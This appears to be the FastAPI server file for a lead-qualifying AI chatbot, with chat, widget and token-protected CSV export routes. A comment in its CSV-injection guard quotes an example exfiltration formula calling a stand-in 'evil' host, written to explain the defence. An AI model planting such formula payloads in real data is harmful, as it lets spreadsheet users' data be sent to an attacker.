# ─── IMPORTS ──────────────────────────────────────────────────────────
from fastapi import FastAPI, HTTPException, Header, Request
from fastapi.responses import HTMLResponse, FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

from pydantic import BaseModel, Field

from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

from agent import process_message
from db import get_all_leads, get_db

import csv
import hmac
import io
import os
import logging

# ─── LOGGING ────────────────────────────────────────────────────────
logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO"),
    format="%(asctime)s %(levelname)s [%(name)s] %(message)s",
)
logger = logging.getLogger(__name__)

# ─── RATE LIMITER ───────────────────────────────────────────────────
limiter = Limiter(key_func=get_remote_address)

# ─── APP SETUP ──────────────────────────────────────────────────────────
app = FastAPI(
    title="Meetric",
    description="Meetric — AI chatbot that qualifies leads in multiple languages (Arabic, French, English), scores them, and books discovery calls automatically",
    version="1.0.0"
)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# ─── CORS MIDDLEWARE ──────────────────────────────────────────────────
# WHAT: Which origins are allowed to call this API from a browser.
# WHY: This bot is designed as an embeddable widget — it needs to work
#      on whatever domain a client puts it on, which isn't known at
#      deploy time. Wildcard is the right default for that use case.
#      For a single-client deployment (or once you know the exact
#      domain(s) it'll be embedded on), set ALLOWED_ORIGINS to a
#      comma-separated list in the environment to lock it down —
#      no code change needed.
#      Example: ALLOWED_ORIGINS=https://client-site.com,https://www.client-site.com
_allowed_origins_env = os.getenv("ALLOWED_ORIGINS", "*").strip()
if _allowed_origins_env == "*":
    ALLOWED_ORIGINS = ["*"]
else:
    ALLOWED_ORIGINS = [o.strip() for o in _allowed_origins_env.split(",") if o.strip()]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=False,          # We don't use cookies
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── SERVE STATIC FILES ──────────────────────────────────────────────
app.mount("/static", StaticFiles(directory="static"), name="static")

# ─── REQUEST MODEL ──────────────────────────────────────────────────
class ChatRequest(BaseModel):
    session_id: str = Field(..., min_length=1, max_length=128)
    message: str = Field(..., min_length=1, max_length=2000)

# ─── ROUTE 1: HOME (Landing Page) ───────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def root():
    """Serve the landing page."""
    return FileResponse("static/landing.html")

# ─── ROUTE 1b: HEALTH CHECK ─────────────────────────────────────────
@app.get("/health")
async def health():
    """Structured health check for infrastructure monitoring."""
    db_ok = True
    try:
        with get_db() as conn:
            conn.execute("SELECT 1")
    except Exception as e:
        logger.error(f"Health check DB query failed: {e}")
        db_ok = False

    return {
        "status": "online" if db_ok else "degraded",
        "database": "ok" if db_ok else "unreachable",
        "message": "Lead Qualification Agent is running!",
    }

# ─── ROUTE 2: CHAT ──────────────────────────────────────────────────
@app.post("/chat")
@limiter.limit("20/minute")
async def chat(request: Request, body: ChatRequest):
    """
    Main chat endpoint.
    Receives a message, processes it through agent.py, returns the bot's reply.

    REQUEST BODY:
        { "session_id": "abc123", "message": "Hi, I need a website" }

    RESPONSE:
        { "reply": "Hello! What's your budget?", "session_id": "abc123" }

    RATE LIMIT: 20 requests/minute per IP. Each request can trigger a
    Gemini API call (sometimes two — reply + extraction), so this is the
    endpoint most exposed to cost abuse if left unlimited.
    """
    try:
        bot_reply = await process_message(body.session_id, body.message)
        return {
            "reply": bot_reply,
            "session_id": body.session_id
        }
    except Exception as e:
        logger.error(f"Chat endpoint error for session {body.session_id}: {e}", exc_info=True)
        raise HTTPException(
            status_code=500,
            detail="Sorry, something went wrong. Please try again."
        )

# ─── ROUTE 3: WIDGET ──────────────────────────────────────────────────
@app.get("/widget", response_class=HTMLResponse)
async def widget():
    """Serve the chat widget HTML."""
    html = open("static/widget.html").read()
    html = html.replace("{{API_BASE}}", os.getenv("API_BASE_URL", ""))
    return HTMLResponse(html)

# ─── CSV / formula injection guard ──────────────────────────────────
# WHAT: Neutralizes "CSV injection" (a well-known, OWASP-documented
#       class of vulnerability): a cell that starts with =, +, -, @, or
#       a raw tab/carriage-return can be interpreted as a FORMULA when
#       the exported CSV is opened in Excel or Google Sheets, rather
#       than as plain text — e.g. =HYPERLINK("http://evil/...","click")
#       can exfiltrate data, and older Excel DDE payloads could execute
#       commands. Confirmed directly: a lead's "need" field containing
#       such a formula flowed straight into the CSV unescaped.
# WHY every field: need/budget/timeline/contact all come from a chat
#       message (attacker-controlled, whether by accident or on
#       purpose). session_id is also client-supplied (ChatRequest only
#       enforces a length limit, no character restriction) and ends up
#       in this export too. id/created_at are server-generated and
#       can't start with these characters anyway, so sanitizing
#       everything uniformly is simpler and safer than trying to guess
#       which fields are "safe".
# HOW: prefixing with a single quote is the standard mitigation — Excel
#      treats a leading ' as "force this cell to plain text" and
#      doesn't display the quote itself, so legitimate values are
#      unaffected; the cell just stops being evaluated as a formula.
_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def _sanitize_csv_cell(value):
    if value is None:
        return value
    s = str(value)
    if s[:1] in _CSV_FORMULA_TRIGGERS:
        return "'" + s
    return s


def _sanitize_lead_row(lead: dict) -> dict:
    return {k: _sanitize_csv_cell(v) for k, v in lead.items()}


# ─── ROUTE 4: EXPORT LEADS ────────────────────────────────────────────
@app.get("/leads/export")
@limiter.limit("10/minute")
async def export_leads(
    request: Request,
    x_export_token: str = Header(default="")
):
    """
    Export all leads as a CSV file.
    Requires X-Export-Token header matching the EXPORT_TOKEN environment variable.

    Example:
        curl -H "X-Export-Token: your-secret-token" https://app.com/leads/export

    SECURITY: hmac.compare_digest prevents timing attacks — an attacker
    measuring response latency can't infer how many characters of their
    guess are correct, unlike a plain == comparison which short-circuits
    on the first mismatched byte. Every exported cell also passes through
    _sanitize_csv_cell() to prevent formula/CSV injection — see above.
    """
    EXPORT_TOKEN = os.getenv("EXPORT_TOKEN", "")
    if not EXPORT_TOKEN:
        raise HTTPException(status_code=503, detail="Export endpoint is not configured.")

    # Constant-time comparison prevents timing-based token enumeration.
    if not hmac.compare_digest(x_export_token, EXPORT_TOKEN):
        raise HTTPException(status_code=401, detail="Unauthorized.")

    leads = get_all_leads()

    if not leads:
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(["id", "session_id", "language", "need", "budget", "timeline", "contact", "score", "created_at"])
        return StreamingResponse(
            iter([output.getvalue()]),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=leads_export.csv"}
        )

    leads = [_sanitize_lead_row(l) for l in leads]

    output = io.StringIO()
    fieldnames = ["id", "session_id", "language", "need", "budget", "timeline", "contact", "score", "created_at"]
    writer = csv.DictWriter(output, fieldnames=fieldnames)
    writer.writeheader()
    writer.writerows(leads)

    return StreamingResponse(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=leads_export.csv"}
    )

# ─── RUN ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
